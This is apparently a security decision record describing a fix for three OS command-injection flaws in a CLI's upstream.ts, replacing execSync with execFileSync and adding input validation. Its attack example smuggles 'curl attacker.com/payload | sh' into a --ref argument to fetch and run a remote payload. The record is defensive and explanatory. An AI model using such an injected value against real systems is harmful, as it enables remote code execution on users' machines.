# Decision: Fix CWE-78 Command Injection in upstream.ts

**Date:** 2026-02-22
**Author:** Baer (Security)
**Requested by:** Brady
**Status:** IMPLEMENTED

## Context

Security audit of `packages/squad-cli/src/cli/commands/upstream.ts` identified 3 CWE-78 (OS Command Injection) vulnerabilities. All three used `execSync` with string interpolation, allowing shell metacharacters in user-supplied `--ref`, `--name`, and source arguments to execute arbitrary commands.

**Attack example:** `squad upstream add https://repo --ref "main && curl attacker.com/payload | sh"`

## Changes Made

1. **Replaced `execSync` → `execFileSync` with array arguments** (3 call sites: add-clone, sync-pull, sync-clone). `execFileSync` bypasses the shell entirely — arguments are passed directly to the `git` binary.

2. **Added input validation functions:**
   - `isValidGitRef(ref)` — allows only `[a-zA-Z0-9._\-/]+`
   - `isValidUpstreamName(name)` — allows only `[a-zA-Z0-9._-]+`
   - Both reject shell metacharacters (`&`, `|`, `;`, backticks, `$`, etc.)

3. **Fixed `fatal` import:** Changed from `error as fatal` (output.js — prints but continues) to real `fatal` (errors.js — throws SquadError, exits). Usage-error paths now properly halt execution.

## Verification

- `npm run build` — passes (0 errors)
- `npm test` — 74 test files, 2022 tests passed

## Risk Assessment

- **Before:** Critical — unauthenticated RCE via CLI argument injection
- **After:** Mitigated — defense in depth (no shell + input validation)
